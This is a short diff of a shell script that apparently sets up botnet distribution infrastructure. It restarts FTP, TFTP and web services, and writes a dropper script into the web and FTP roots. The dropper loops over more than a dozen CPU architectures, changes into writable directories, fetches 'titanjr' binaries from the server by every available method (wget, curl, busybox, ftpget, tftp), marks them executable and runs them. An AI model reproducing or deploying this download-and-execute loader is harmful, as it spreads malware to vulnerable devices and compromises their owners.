@@ -82,7 +82,6 @@ EOF
 service xinetd restart
 service vsftpd restart
 service apache2 restart
-ip=$(curl -s http://api.ipify.org)
 script='#!/bin/bash\nfor a in x86_32 i486 mips arc i686 x86_64 mipsl arm arm5 arm6 arm7 ppc ppc440 m68k sh4; do\n    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget -O newcron http://'"$ip"'/huhu/titanjr.$a || curl -O newcron http://'"$ip"'/huhu/titanjr.$a || busybox wget -O newcron http://'"$ip"'/huhu/titanjr.$a || busybox ftpget -v -u anonymous -p anonymous -P 21 '"$ip"' titanjr.$a newcron || busybox tftp '"$ip"' -c get titanjr.$a -o newcron || busybox tftp -r titanjr.$a -g '"$ip"' -l newcron || ftpget -v -u anonymous -p anonymous -P 21 '"$ip"' titanjr.$a newcron || tftp '"$ip"' -c get titanjr.$a -o newcron || tftp -r titanjr.$a -g '"$ip"' -l newcron;chmod 777 newcron;./newcron all\ndone'
 echo -e "$script" > /var/www/html/all.sh
 echo -e "$script" > /var/ftp/all.sh
